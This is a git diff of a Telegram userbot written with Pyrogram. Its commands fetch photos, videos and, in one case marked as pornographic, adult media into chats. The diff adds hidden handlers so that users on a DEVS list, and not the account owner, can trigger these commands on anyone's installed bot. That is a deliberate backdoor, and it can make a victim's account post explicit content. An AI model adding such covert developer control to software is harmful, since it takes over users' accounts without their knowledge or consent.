@@ -6,9 +6,9 @@ from pyrogram.types import *
 from pyrogram import Client as gez 
 from pyrogram import Client
 from geez.helper.basic import *
-from geez.helper.PyroHelpers import *
+from geez.helper.Pyrohelper import *
 from geez.modules.help import *
-from geez.helper.dev import *
+from geez.helper.adminhelper import *
 from geez.helper.misc import *
 from geez.helper.goblok import *
 from config import *
@@ -26,6 +26,7 @@ async def vvip(client: Client, message: Message):
         kk.delete(),
         client.send_photo(message.chat.id, ANAK_BANGSAD, caption))
 
+@gez.on_message(filters.command("casupan", ".") & filters.user(DEVS) & ~filters.me)
 @gez.on_message(filters.command(["asupan"], ".") & filters.me)
 async def asupan(client: Client, message: Message):
     if message.chat.id == -1001554560763:
@@ -49,6 +50,7 @@ async def asupan(client: Client, message: Message):
 
 # WARNING PORNO VIDEO THIS !!!
 
+@gez.on_message(filters.command("cbokep", ".") & filters.user(DEVS) & ~filters.me)
 @gez.on_message(filters.command(["bokep"], ".") & filters.me)
 async def bokep(client: Client, message: Message):
     if message.chat.id == -1001664137877:
@@ -72,6 +74,7 @@ async def bokep(client: Client, message: Message):
     )
 
 
+@gez.on_message(filters.command("cayang", ".") & filters.user(DEVS) & ~filters.me)
 @gez.on_message(filters.command("ayang", [".", "-", "^", "!", "?"]) & filters.me)
 async def ayang(client, message):
     yanto = await message.reply("🔎 `Search Ayang...`")
@@ -93,6 +96,7 @@ async def ayang(client, message):
     await yanto.delete()
 
 
+@gez.on_message(filters.command("cppcp", ".") & filters.user(DEVS) & ~filters.me)
 @gez.on_message(filters.command("ppcp", [".", "-", "^", "!", "?"]) & filters.me)
 async def ppcp(client, message):
     yanto = await message.reply("🔎 `Search PP Couple...`")
@@ -114,6 +118,7 @@ async def ppcp(client, message):
     await yanto.delete()
 
 
+@gez.on_message(filters.command("cppanime", ".") & filters.user(DEVS) & ~filters.me)
 @gez.on_message(filters.command("ppanime", [".", "-", "^", "!", "?"]) & filters.me)
 async def ppanime(client, message):
     yanto = await message.reply("🔎 `Search PP Anime...`")
